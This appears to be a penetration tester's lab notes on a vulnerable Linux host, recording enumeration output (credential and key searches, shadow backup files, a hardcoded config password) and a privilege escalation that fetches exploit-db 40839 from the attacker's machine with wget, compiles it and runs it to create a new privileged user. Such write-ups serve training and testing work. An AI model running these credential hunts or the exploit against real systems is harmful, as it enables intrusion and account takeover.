/etc/X11/app-defaults/XScreenSaver-nogl:! The format used for printing the date and time in the password dialog box
/etc/X11/app-defaults/XScreenSaver-nogl:! Resources for the password and splash-screen dialog boxes of
/etc/X11/app-defaults/XScreenSaver-nogl:*passwd.body.label:             Please enter your password.
/etc/wpa_supplicant/functions.sh:                       set_network password wpa-password
/etc/mysql/my.cnf:# It has been reported that passwords should be enclosed with ticks/quotes
/etc/ssl/openssl.cnf:# input_password = secret
/etc/ssl/openssl.cnf:# output_password = secret
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
/etc/dictionaries-common/words:password
/etc/dictionaries-common/words:password's
/etc/dictionaries-common/words:passwords
/etc/login.defs:#       PASS_MAX_DAYS   Maximum number of days a password may be used.
/etc/login.defs:#       PASS_MIN_DAYS   Minimum number of days allowed between password changes.
/etc/login.defs:#       PASS_WARN_AGE   Number of days warning given before a password expires.
/etc/login.defs:# Max number of login retries if password is bad. This will most likely be
/etc/login.defs:# If set to "yes", new passwords will be encrypted using the MD5-based
/etc/login.defs:# It supports passwords of unlimited length and longer salt strings.
/etc/login.defs:# Set to "no" if you need to copy encrypted passwords to other systems

[+] web roots
$ ls -la /var/www 2>/dev/null
total 16
drwxr-xr-x  3 root root 4096 Sep  8  2020 .
drwxr-xr-x 16 root root 4096 Nov  9  2011 ..
-rw-r--r--  1 root root   75 Nov  9  2011 index.html
drwxrwxr-x 12 root root 4096 Nov  9  2011 test

[+] web creds (first 50)
$ grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50
/var/www/test/index.php:                $_zp_gallery_page = 'password.php';
/var/www/test/index.php:                $_zp_obj = SERVERPATH.'/'.THEMEFOLDER.'/'.$theme.'/password.php';
/var/www/test/index.php:                        $_zp_obj = SERVERPATH.'/'.ZENFOLDER.'/password.php';
/var/www/test/index.php:db_close();     // close the database as we are done
/var/www/test/themes/garland/functions.php:     $exclude_login = array('password.php','register.php','contact.php');
/var/www/test/themes/garland/functions.php:             <?php if ($_zp_gallery_page != 'password.php' && $_zp_gallery_page != 'archive.php') printCustomPageURL(gettext('Archive View'), 'archive', '', ' | ', ''); ?>
/var/www/test/themes/garland/functions.php:             <?php   if ($_zp_gallery_page!='contact.php' && getOption('zp_plugin_contact_form') && ($_zp_gallery_page != 'password' || $_zp_gallery->isUnprotectedPage('contact'))) printCustomPageURL(gettext('Contact us'), 'contact', '', ' | ', '');       ?>
/var/www/test/themes/garland/functions.php:             <?php if ($_zp_gallery_page!='register.php' && !zp_loggedin() && function_exists('printRegistrationForm') && ($_zp_gallery_page != 'password.php' || $_zp_gallery->isUnprotectedPage('register'))) printCustomPageURL(gettext('Register for this site'), 'register', '', ' | ', '');       ?>
/var/www/test/themes/garland/password.php:                                                      <h3><?php echo gettext('A password is required to access this page.') ?></h3>
/var/www/test/themes/zenpage/style.css:table.password td.userlabel{
/var/www/test/themes/zenpage/style.css:table.password td.userinput{
/var/www/test/themes/zenpage/style.css:table.password td.userinput input, td.passwordinput input {
/var/www/test/themes/zenpage/style.css:table.password td.passwordlabel{
/var/www/test/themes/zenpage/style.css:table.password td.passwordinput{
/var/www/test/themes/zenpage/style.css:table.password td.submit{
/var/www/test/themes/zenpage/style.css:table.password td.hint{
/var/www/test/themes/zenpage/password.php:      <h2><a href="<?php echo getGalleryIndexURL(); ?>">Index</a> &raquo; <strong><?php echo gettext("A password is required for the page you requested"); ?></strong></h2>
Binary file /var/www/test/themes/effervescence_plus/images/zen-logo.jpg matches
Binary file /var/www/test/themes/effervescence_plus/images/smooth/fleche1.gif matches
/var/www/test/themes/effervescence_plus/common.css:.password h2{
/var/www/test/themes/effervescence_plus/functions.php:  $count = db_result($result, 0);
/var/www/test/themes/effervescence_plus/functions.php:          $tagit = "\n".gettext('The album is password protected.');
/var/www/test/themes/effervescence_plus/functions.php:          <?php   if (function_exists('printUserLogin_out') && $_zp_gallery_page != 'password') printUserLogin_out('<br />', '', true); ?>
/var/www/test/themes/effervescence_plus/functions.php:          <?php   if (getOption('zp_plugin_contactform') && ($_zp_gallery_page != 'password' || $_zp_gallery->isUnprotectedPage('contact'))) printCustomPageURL(gettext('Contact us'), 'contact', '', '<br />');     ?>
/var/www/test/themes/effervescence_plus/functions.php:          <?php if (!zp_loggedin() && function_exists('printRegistrationForm') && ($_zp_gallery_page != 'password' || $_zp_gallery->isUnprotectedPage('unprotected_register'))) printCustomPageURL(gettext('Register for this site'), 'register', '', '<br />');     ?>
/var/www/test/themes/effervescence_plus/password.php:                           <?php echo gettext('A password is required for the page you requested'); ?>
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:color: #fbefdb; /*text in bread-crumb navigato. (last node and the pipes)*/
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:border-top: 2px solid #fbefdb;
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:border-left: 2px solid #fbefdb;
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:border-top: 2px solid #fbefdb;
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:border-left: 2px solid #fbefdb;
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:color: #fbefdb; /*header next/prev in single-image view.*/
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:color: #fbefdb;
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:#passwordform {
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:table.password {
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:table.password td.userlabel{
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:table.password td.userinput{
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:table.password td.userinput input, td.passwordinput input {
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:table.password td.passwordlabel{
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:table.password td.passwordinput{
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:table.password td.submit{
/var/www/test/themes/effervescence_plus/styles/free chocolates.css:table.password td.hint{
/var/www/test/themes/effervescence_plus/styles/blue and green play.css:color: #fbefdb; /*text in bread-crumb navigato. (last node and the pipes)*/
/var/www/test/themes/effervescence_plus/styles/blue and green play.css:border-top: 2px solid #fbefdb;
/var/www/test/themes/effervescence_plus/styles/blue and green play.css:border-left: 2px solid #fbefdb;
/var/www/test/themes/effervescence_plus/styles/blue and green play.css:border-top: 2px solid #fbefdb;
/var/www/test/themes/effervescence_plus/styles/blue and green play.css:border-left: 2px solid #fbefdb;
/var/www/test/themes/effervescence_plus/styles/blue and green play.css: color: #fbefdb; /*header next/prev in single-image view.*/
/var/www/test/themes/effervescence_plus/styles/blue and green play.css:color: #fbefdb;
/var/www/test/themes/effervescence_plus/styles/blue and green play.css:#passwordform {

[+] text files in /home
$ find /home -type f -name "*.txt" 2>/dev/null
/home/local.txt

[+] history files in /home
$ find /home -type f -name "*history*" 2>/dev/null

[+] ssh keys in /home
$ find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null

[+] sensitive strings in /home (first 50)
$ grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50

[+] backup files (first 50)
$ find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
/var/backups/gshadow.bak
/var/backups/group.bak
/var/backups/passwd.bak
/var/backups/shadow.bak
/etc/apt/trusted.gpg~

```

9. Containers / Virtualization 

```
[+] docker env file
$ ls -la /.dockerenv 2>/dev/null

[+] cgroup hints
$ grep -i docker /proc/1/cgroup 2>/dev/null

```

10. Automated Enumeration

```
Linux version 2.6.32-21-generic (buildd@rothera) (gcc version 4.4.3 (Ubuntu 4.4.3-4ubuntu5) ) #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010                     
Sudo version 1.7.2p1                                          

/var/www/test/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/inc/config.base.php:       define('CONFIG_LOGIN_PASSWORD', '123456');                                                                         
/var/www/test/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/inc/config.tinymce.php:    define('CONFIG_LOGIN_PASSWORD', '123456');

tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
user            = mysql

passwd file: /usr/share/lintian/overrides/passwd

-r-xr-sr-x 1 root games 126K Apr 13  2010 /usr/games/quadrapassel (Unknown SGID binary)

/var/lib/php5

/.bash_history

 /usr/share/doc/telnet/

   
```

11. Possible PE Paths

```
/usr/bin/changeip
root       884     1  0 17:36 ?        00:00:00 /usr/sbin/cupsd -C 
/etc/cups/cupsd.conf

https://gtfobins.github.io/gtfobins/mount/

https://www.exploit-db.com/exploits/41770
https://www.exploit-db.com/exploits/14814
https://www.exploit-db.com/exploits/10018
https://www.exploit-db.com/exploits/9844
https://www.exploit-db.com/exploits/11651

```

**Privilege Escalation**

1. PE Steps

- Downloaded https://www.exploit-db.com/exploits/40839 from Kali machine to victim.

```
wget 192.168.45.151/40839.c
```

![[Pasted image 20260120134030.png]]
- Compiled code 

```
gcc -pthread 40839.c -o dirty -lcrypt
```

![[Pasted image 20260120134151.png]]

- Ran exploit and logged in with newly created user/password. 

```
./dirty my-new-password
```

![[Pasted image 20260120134327.png]]

2. Notes

```

```

